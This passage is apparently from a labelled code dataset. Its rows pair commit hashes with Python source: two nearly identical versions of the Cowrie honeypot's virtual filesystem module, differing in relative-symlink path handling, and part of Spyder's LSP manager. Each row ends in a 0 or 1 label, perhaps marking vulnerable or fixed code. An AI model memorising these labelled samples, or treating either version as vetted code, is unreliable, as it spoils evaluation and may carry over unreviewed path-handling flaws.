    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """"""
    pass



class FileNotFound(Exception):
    """"""
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """"""
    pass



class HoneyPotFilesystem(object):
    """"""
    """"""

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """"""
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """"""

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """"""
        This function does not need to be in this class, it has no dependencies
        """"""
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """"""
        Resolve_path with wildcard support (globbing)
        """"""
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system objects for a directory
        """"""
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """"""
        """"""
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system object for a path
        """"""
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            # cwd = '/'.join((cwd, piece))
        return p


    def file_contents(self, target):
        """"""
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """"""
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """"""
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """"""
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """"""
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """"""
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """"""
    Below additions for SFTP support, try to keep functions here similar to os.*
    """"""
    def open(self, filename, openFlags, mode):
        """"""
        #log.msg(""fs.open %s"" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg(""fs.open append"")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg(""fs.open creat"")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg(""fs.open trunc"")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg(""fs.open excl"")

        # treat O_RDWR same as O_WRONLY
        """"""
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg(""fs.open file for writing, saving to %s"" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """"""
        """"""
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """"""
        """"""
        return os.write(fd, string)


    def close(self, fd):
        """"""
        """"""
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + ""/"" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \""%(filename)s\"" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """"""
        """"""
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """"""
        FIXME mkdir() name conflicts with existing mkdir
        """"""
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """"""
        """"""
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """"""
        """"""
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """"""
        """"""
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """"""
        """"""
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """"""
        """"""
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """"""
        """"""
        if (path == ""/""):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """"""
        """"""
        return path


    def update_size(self, filename, size):
        """"""
        """"""
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """"""
    Transform a tuple into a stat object
    """"""
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime

/n/n/n",0
91,cb2c5d4f654cc4709c3edc97ec7216c210901c78,"/cowrie/shell/fs.py/n/n# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

""""""
This module contains ...
""""""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """"""
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """"""
    pass



class FileNotFound(Exception):
    """"""
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """"""
    pass



class HoneyPotFilesystem(object):
    """"""
    """"""

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """"""
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """"""

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """"""
        This function does not need to be in this class, it has no dependencies
        """"""
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """"""
        Resolve_path with wildcard support (globbing)
        """"""
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system objects for a directory
        """"""
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """"""
        """"""
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system object for a path
        """"""
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            cwd = '/'.join((cwd, piece))
        return p


    def file_contents(self, target):
        """"""
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """"""
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
            # Zero-byte file lacking A_REALFILE backing: probably empty.
            # (The exceptions to this are some system files in /proc and /sys,
            # but it's likely better to return nothing than suspiciously fail.)
            return ''


    def mkfile(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            return False
        if ctime is None:
            ctime = time.time()
        dir = self.get_path(os.path.dirname(path))
        outfile = os.path.basename(path)
        if outfile in [x[A_NAME] for x in dir]:
            dir.remove([x for x in dir if x[A_NAME] == outfile][0])
        dir.append([outfile, T_FILE, uid, gid, size, mode, ctime, [],
            None, None])
        self.newcount += 1
        return True


    def mkdir(self, path, uid, gid, size, mode, ctime=None):
        """"""
        """"""
        if self.newcount > 10000:
            raise OSError(errno.EDQUOT, os.strerror(errno.EDQUOT), path)
        if ctime is None:
            ctime = time.time()
        if not len(path.strip('/')):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
        try:
            dir = self.get_path(os.path.dirname(path.strip('/')))
        except IndexError:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT), path)
            return False
        dir.append([os.path.basename(path), T_DIR, uid, gid, size, mode,
            ctime, [], None, None])
        self.newcount += 1


    def isfile(self, path):
        """"""
        Return True if path is an existing regular file. This follows symbolic
        links, so both islink() and isfile() can be true for the same path.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_FILE


    def islink(self, path):
        """"""
        Return True if path refers to a directory entry that is a symbolic
        link. Always False if symbolic links are not supported by the python
        runtime.
        """"""
        try:
            f = self.getfile(path)
        except:
            return False
        return f[A_TYPE] == T_LINK


    def isdir(self, path):
        """"""
        Return True if path is an existing directory.
        This follows symbolic links, so both islink() and isdir() can be true for the same path.
        """"""
        if path == '/':
            return True
        try:
            dir = self.getfile(path)
        except:
            dir = None
        if dir is None or dir is False:
            return False
        if dir[A_TYPE] == T_DIR:
            return True
        else:
            return False

    """"""
    Below additions for SFTP support, try to keep functions here similar to os.*
    """"""
    def open(self, filename, openFlags, mode):
        """"""
        #log.msg(""fs.open %s"" % filename)

        #if (openFlags & os.O_APPEND == os.O_APPEND):
        #    log.msg(""fs.open append"")

        #if (openFlags & os.O_CREAT == os.O_CREAT):
        #    log.msg(""fs.open creat"")

        #if (openFlags & os.O_TRUNC == os.O_TRUNC):
        #    log.msg(""fs.open trunc"")

        #if (openFlags & os.O_EXCL == os.O_EXCL):
        #    log.msg(""fs.open excl"")

        # treat O_RDWR same as O_WRONLY
        """"""
        if openFlags & os.O_WRONLY == os.O_WRONLY or openFlags & os.O_RDWR == os.O_RDWR:
            # strip executable bit
            hostmode = mode & ~(111)
            hostfile = '%s/%s_sftp_%s' % \
                       (self.cfg.get('honeypot', 'download_path'),
                    time.strftime('%Y%m%d-%H%M%S'),
                    re.sub('[^A-Za-z0-9]', '_', filename))
            #log.msg(""fs.open file for writing, saving to %s"" % safeoutfile)
            self.mkfile(filename, 0, 0, 0, stat.S_IFREG | mode)
            fd = os.open(hostfile, openFlags, hostmode)
            self.update_realfile(self.getfile(filename), hostfile)
            self.tempfiles[fd] = hostfile
            self.filenames[fd] = filename
            return fd

        elif openFlags & os.O_RDONLY == os.O_RDONLY:
            return None

        return None


    def read(self, fd, size):
        """"""
        """"""
        # this should not be called, we intercept at readChunk
        raise notImplementedError


    def write(self, fd, string):
        """"""
        """"""
        return os.write(fd, string)


    def close(self, fd):
        """"""
        """"""
        if not fd:
            return True
        if self.tempfiles[fd] is not None:
            shasum = hashlib.sha256(open(self.tempfiles[fd], 'rb').read()).hexdigest()
            shasumfile = self.cfg.get('honeypot', 'download_path') + ""/"" + shasum
            if (os.path.exists(shasumfile)):
                os.remove(self.tempfiles[fd])
            else:
                os.rename(self.tempfiles[fd], shasumfile)
            #os.symlink(shasum, self.tempfiles[fd])
            self.update_realfile(self.getfile(self.filenames[fd]), shasumfile)
            log.msg(format='SFTP Uploaded file \""%(filename)s\"" to %(outfile)s',
                    eventid='cowrie.session.file_upload',
                    filename=os.path.basename(self.filenames[fd]),
                    outfile=shasumfile,
                    shasum=shasum)
            del self.tempfiles[fd]
            del self.filenames[fd]
        return os.close(fd)


    def lseek(self, fd, offset, whence):
        """"""
        """"""
        if not fd:
            return True
        return os.lseek(fd, offset, whence)


    def mkdir2(self, path):
        """"""
        FIXME mkdir() name conflicts with existing mkdir
        """"""
        dir = self.getfile(path)
        if dir != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        self.mkdir(path, 0, 0, 4096, 16877)


    def rmdir(self, path):
        """"""
        """"""
        path = path.rstrip('/')
        name = os.path.basename(path)
        parent = os.path.dirname(path)
        dir = self.getfile(path, follow_symlinks=False)
        if dir == False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST), path)
        if dir[A_TYPE] != T_DIR:
            raise OSError(errno.ENOTDIR, os.strerror(errno.ENOTDIR), path)
        if len(self.get_path(path))>0:
            raise OSError(errno.ENOTEMPTY, os.strerror(errno.ENOTEMPTY), path)
        pdir = self.get_path(parent,follow_symlinks=True)
        for i in pdir[:]:
            if i[A_NAME] == name:
                pdir.remove(i)
                return True
        return False


    def utime(self, path, atime, mtime):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_CTIME] = mtime


    def chmod(self, path, perm):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        p[A_MODE] = stat.S_IFMT(p[A_MODE]) | perm


    def chown(self, path, uid, gid):
        """"""
        """"""
        p = self.getfile(path)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if (uid != -1):
            p[A_UID] = uid
        if (gid != -1):
            p[A_GID] = gid


    def remove(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        self.get_path(os.path.dirname(path)).remove(p)
        return


    def readlink(self, path):
        """"""
        """"""
        p = self.getfile(path, follow_symlinks=False)
        if p == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        if not (p[A_MODE] & stat.S_IFLNK):
            raise OSError
        return p[A_TARGET]


    def symlink(self, targetPath, linkPath):
        """"""
        """"""
        raise notImplementedError


    def rename(self, oldpath, newpath):
        """"""
        """"""
        old = self.getfile(oldpath)
        if old == False:
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
        new = self.getfile(newpath)
        if new != False:
            raise OSError(errno.EEXIST, os.strerror(errno.EEXIST))

        self.get_path(os.path.dirname(oldpath)).remove(old)
        old[A_NAME] = os.path.basename(newpath)
        self.get_path(os.path.dirname(newpath)).append(old)
        return


    def listdir(self, path):
        """"""
        """"""
        names = [x[A_NAME] for x in self.get_path(path)]
        return names


    def lstat(self, path):
        """"""
        """"""
        return self.stat(path, follow_symlinks=False)


    def stat(self, path, follow_symlinks=True):
        """"""
        """"""
        if (path == ""/""):
            p = {A_TYPE:T_DIR, A_UID:0, A_GID:0, A_SIZE:4096, A_MODE:16877,
                A_CTIME:time.time()}
        else:
            p = self.getfile(path, follow_symlinks=follow_symlinks)

        if (p == False):
            raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))

        return _statobj( p[A_MODE], 0, 0, 1, p[A_UID], p[A_GID], p[A_SIZE],
            p[A_CTIME], p[A_CTIME], p[A_CTIME])


    def realpath(self, path):
        """"""
        """"""
        return path


    def update_size(self, filename, size):
        """"""
        """"""
        f = self.getfile(filename)
        if f == False:
            return
        if f[A_TYPE] != T_FILE:
            return
        f[A_SIZE] = size



class _statobj(object):
    """"""
    Transform a tuple into a stat object
    """"""
    def __init__(self, st_mode, st_ino, st_dev, st_nlink, st_uid, st_gid, st_size, st_atime, st_mtime, st_ctime):
        self.st_mode = st_mode
        self.st_ino = st_ino
        self.st_dev = st_dev
        self.st_nlink = st_nlink
        self.st_uid = st_uid
        self.st_gid = st_gid
        self.st_size = st_size
        self.st_atime = st_atime
        self.st_mtime = st_mtime
        self.st_ctime = st_ctime

/n/n/n",1
92,2374cc1427f01db4814fbdde9962471e17111084,"spyder/plugins/editor/lsp/manager.py/n/n# -*- coding: utf-8 -*-
#
# Copyright © Spyder Project Contributors
# Licensed under the terms of the MIT License
# (see spyder/__init__.py for details)

""""""
Manager for all LSP clients connected to the servers defined
in our Preferences.
""""""

# Standard library imports
import logging
import os
import os.path as osp

# Third-party imports
from qtpy.QtCore import QObject, Slot

# Local imports
from spyder.config.base import get_conf_path
from spyder.config.main import CONF
from spyder.utils.misc import select_port, getcwd_or_home
from spyder.plugins.editor.lsp.client import LSPClient


logger = logging.getLogger(__name__)


class LSPManager(QObject):
    """"""Language Server Protocol manager.""""""
    STOPPED = 'stopped'
    RUNNING = 'running'

    def __init__(self, parent):
        QObject.__init__(self)
        self.main = parent

        self.lsp_plugins = {}
        self.clients = {}
        self.requests = {}
        self.register_queue = {}

        # Get configurations for all LSP servers registered through
        # our Preferences
        self.configurations_for_servers = CONF.options('lsp-server')

        # Register languages to create clients for
        for language in self.configurations_for_servers:
            self.clients[language] = {
                'status': self.STOPPED,
                'config': CONF.get('lsp-server', language),
                'instance': None
            }
            self.register_queue[language] = []

    def register_plugin_type(self, type, sig):
        self.lsp_plugins[type] = sig

    def register_file(self, language, filename, signal):
        if language in self.clients:
            language_client = self.clients[language]['instance']
            if language_client is None:
                self.register_queue[language].append((filename, signal))
            else:
                language_client.register_file(filename, signal)

    def get_root_path(self, language):
        """"""
        Get root path to pass to the LSP servers.

        This can be the current project path or the output of
        getcwd_or_home (except for Python, see below).
        """"""
        path = None

        # Get path of the current project
        if self.main and self.main.projects:
            path = self.main.projects.get_active_project_path()

        # If there's no project, use the output of getcwd_or_home.
        if not path:
            # We can't use getcwd_or_home for Python because if it
            # returns home and you have a lot of Python files on it
            # then computing Rope completions takes a long time
            # and blocks the PyLS server.
            # Instead we use an empty directory inside our config one,
            # just like we did for Rope in Spyder 3.
            if language == 'python':
                path = get_conf_path('lsp_root_path')
                if not osp.exists(path):
                    os.mkdir(path)
            else:
                path = getcwd_or_home()

        return path

    @Slot()
    def reinitialize_all_lsp_clients(self):
        """"""
        Send a new initialize message to each LSP server when the project
        path has changed so they can update the respective server root paths.
        """"""
        for language in self.clients:
            language_client = self.clients[language]
            if language_client['status'] == self.RUNNING:
                folder = self.get_root_path(language)
                instance = language_client['instance']
                instance.folder = folder
                instance.initialize()

    def start_lsp_client(self, language):
        started = False
        if language in self.clients:
            language_client = self.clients[language]
            queue = self.register_queue[language]

            # Don't start LSP services in our CIs unless we demand
            # them.
            if (os.environ.get('CI', False) and
                    not os.environ.get('SPY_TEST_USE_INTROSPECTION')):
                return started

            # Start client
            started = language_client['status'] == self.RUNNING
            if language_client['status'] == self.STOPPED:
                config = language_client['config']

                if not config['external']:
                    port = select_port(default_port=config['port'])
                    config['port'] = port

                language_client['instance'] = LSPClient(
                    parent=self,
                    server_settings=config,
                    folder=self.get_root_path(language),
                    language=language)

                for plugin in self.lsp_plugins:
                    language_client['instance'].register_plugin_type(
                        plugin, self.lsp_plugins[plugin])

                logger.info(""Starting LSP client for {}..."".format(language))
                language_client['instance'].start()
                language_client['status'] = self.RUNNING
                for entry in queue:
                    language_client.register_file(*entry)
                self.register_queue[language] = []
        return started

    def shutdown(self):
        logger.info(""Shutting down LSP manager..."")
        for language in self.clients:
            self.close_client(language)

    def update_server_list(self):
        for language in self.configurations_for_servers:
            config = {'status': self.STOPPED,
                      'config': CONF.get('lsp-server', language),
                      'instance': None}
            if language not in self.clients:
